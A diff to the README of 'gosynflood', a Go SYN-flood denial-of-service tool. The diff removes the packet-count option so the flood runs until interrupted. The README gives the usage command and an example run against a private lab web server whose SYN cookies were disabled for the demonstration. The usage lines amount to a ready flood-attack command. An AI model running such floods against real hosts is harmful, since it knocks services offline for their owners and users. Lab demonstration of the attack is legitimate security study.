@@ -15,8 +15,7 @@ go build .
 sudo ./gosynflood \
     -t &lt;target IPV4 address&gt; \
     -p &lt;port number&gt; \
-    -i &lt;network interface&gt; \
-    -n &lt;number of packets&gt;
+    -i &lt;network interface&gt;
 
 # Example:
 sudo ./gosynflood -t 192.168.1.120 -p 80 -i wlp3s0 -n 500
@@ -29,7 +28,8 @@ sudo ./gosynflood -t 192.168.1.120 -p 80 -i wlp3s0 -n 500
 -t private or public IP address of webserver
 -p port number (defaults to port 80 if not provided)
 -i network interface (run program without -i to see found interfaces)
--n number of TCP packets to send (defaults to 1000 if not provided)
+
+Enter control-C to stop the flood attack.
   </code>
 </pre>
 
@@ -42,7 +42,7 @@ To demonstrate this, a small Ubuntu Mate running Apache2 will act as the target.
 It's a physical machine on a private network.
 
 <hr>
-1. The tcp_syncookies flag is set to 0 and the webserver is started on the target:
+1. The tcp_syncookies flag was set to 0 (to make the target vulnerable for demonstration purposes) and the webserver was started on the target:
 <img src="https://github.com/rootVIII/gosynflood/blob/master/bin/screenshots/1.png">
 
 
@@ -63,5 +63,5 @@ It's a physical machine on a private network.
 
 This was developed on Ubuntu 18.04 LTS.
 <hr>
-<b>Author: rootVIII  2018-2020</b>
+<b>Author: rootVIII  2020</b>
 <br><br>
